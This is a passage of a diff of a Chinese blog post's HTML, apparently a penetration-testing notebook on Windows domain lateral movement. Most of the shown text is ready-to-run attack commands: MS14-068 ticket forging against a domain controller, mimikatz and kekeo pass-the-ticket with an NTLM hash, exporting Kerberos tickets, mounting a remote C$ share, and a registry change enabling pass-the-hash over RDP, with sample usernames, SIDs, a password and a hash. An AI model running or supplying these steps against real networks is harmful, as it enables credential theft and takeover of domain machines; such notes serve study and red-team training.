-1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>2.mimikaz   </p>
-<pre class="line-numbers language-none"><code class="language-none">kerberos::purge			&#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造。
-kerberos::list			&#x2F;&#x2F;查看当前机器凭证
-kerberos::ptc 票据文件	 &#x2F;&#x2F;将票据注入到内存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Arduino"><div class="codebox"><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge			<span class="comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造。</span></span><br><span class="line">kerberos::list			<span class="comment">//查看当前机器凭证</span></span><br><span class="line">kerberos::ptc 票据文件	 <span class="comment">//将票据注入到内存中</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>3.利用MS14-068生成TGT数据</p>
-<pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u 域成员名@域名 -s sid -d 域控地址 -p 域成员密码
-MS14-068.exe -u jiarong.gao@zj.com -s S-1-5-21-3032773461-2117130829-2438403642-1103 -d 10.1.1.1 -p 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ms14</span>-<span class="number">068</span>.exe -u 域成员名@域名 -s sid -d 域控地址 -p 域成员密码</span><br><span class="line"><span class="attribute">MS14</span>-<span class="number">068</span>.exe -u jiarong.gao@zj.com -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3032773461</span>-<span class="number">2117130829</span>-<span class="number">2438403642</span>-<span class="number">1103</span> -d <span class="number">10.1.1.1</span> -p <span class="number">666</span>.com</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>4.票据注入内存</p>
-<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ptc TGT_mary@zj.com.ccache&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Awk"><div class="codebox"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptc TGT_mary@zj.com.ccache&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>5.查看凭证列表</p>
-<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Ebnf"><div class="codebox"><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">klist</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>6.利用</p>
-<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> \\<span class="number">10.1.1.1</span>\c$</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>第二种</strong>利用工具kekeo</p>
 <p>1.生成票据</p>
-<pre class="line-numbers language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:jiarong.gao &#x2F;domain:zj.com &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">kekeo</span> <span class="string">&quot;tgt::ask /user:jiarong.gao /domain:zj.com /ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>2.导入票据</p>
-<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Arduino"><div class="codebox"><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 票据名</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>2.查看凭证</p>
-<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Ebnf"><div class="codebox"><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">klist</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>4.利用net use 载入</p>
-<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> \\<span class="number">10.1.1.1</span>\c$</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>第三种</strong>利用本地票据（管理员权限）、</p>
-<pre class="line-numbers language-none"><code class="language-none">sekurlsa::tickets &#x2F;export
-kerberos::ptt xxxxxxxx.xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Cpp"><div class="codebox"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /<span class="keyword">export</span></span><br><span class="line">kerberos::ptt xxxxxxxx.xxxx.kirbi</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="rdp">RDP</span></h1><p>与linux的ssh协议类似，这是windows的远程桌面连接（图形）的协议，端口为<strong>3389</strong></p>
 <p>RDP明文密码连接</p>
-<pre class="line-numbers language-none"><code class="language-none">windows:	mstsc
-mstsc.exe &#x2F;console &#x2F;v:10.1.1.1 &#x2F;administrator
-
-linux: rdesktop 10.1.1.1:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:	mstsc</span><br><span class="line">mstsc.exe /console /v:10.1.1.1 /administrator</span><br><span class="line"></span><br><span class="line">linux: rdesktop 10.1.1.1:3389</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>RDP密文HASH链接</p>
 <p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win7 和Windows Server 2008 R2安装了KB2871997、KB2973351补丁也支持。</p>
 <p>开启命令：</p>
-<pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Dockerfile"><div class="codebox"><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span><span class="language-bash"> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>然后：</p>
-<pre class="line-numbers language-none"><code class="language-none">mstsc.exe &#x2F;restrictedadmin
-mimikatz.exe
-privilege::debug
-sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:zj /ntlm:6f8a61c6702f90ae246aa2a298fcdc35 <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <hr>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 jjjing 于 2022-08-06 15:11:33 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/">横向移动 | xiaodisec</a></span><button class="copy-text" type="button" data-text="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>jjjing</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div><div class="post-nav"><a class="post-nav-prev" href="/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow_web入门_文件包含">上一篇<span>ctfshow_web入门_文件包含</span></a><a class="post-nav-next" href="/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/" title="内网穿透 | xiaodisec">下一篇<span>内网穿透 | xiaodisec</span></a></div></div><aside id="post-sidebar" status="show" active=""><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">at&amp;schtasks</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">at</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">schtasks</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">atexec-impacket</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">批量利用</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">psexec&amp;smbexec</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">psexec</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">smbexec</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">wmic&amp;wmiexec</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">PTH&amp;PTT&amp;PTK</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">PTH</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">PTK</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">PTT</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">RDP</span></a></li></ol></div></div><script>document.addEventListener('DOMContentLoaded', function () {
+  var headings = Array.from(document.querySelectorAll('.post h1, .post h2, .post h3, .post h4, .post h5, .post h6'));
+  var usedHeadings = [];
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a href="/categories/">分类</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">at&amp;schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">at</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">schtasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">atexec-impacket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">批量利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">psexec&amp;smbexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">wmic&amp;wmiexec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">PTH&amp;PTT&amp;PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">PTT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">RDP</span></a></li></ol>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&text=横向移动 | xiaodisec"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&is_video=false&description=横向移动 | xiaodisec"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=横向移动 | xiaodisec&body=Check out this article: https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
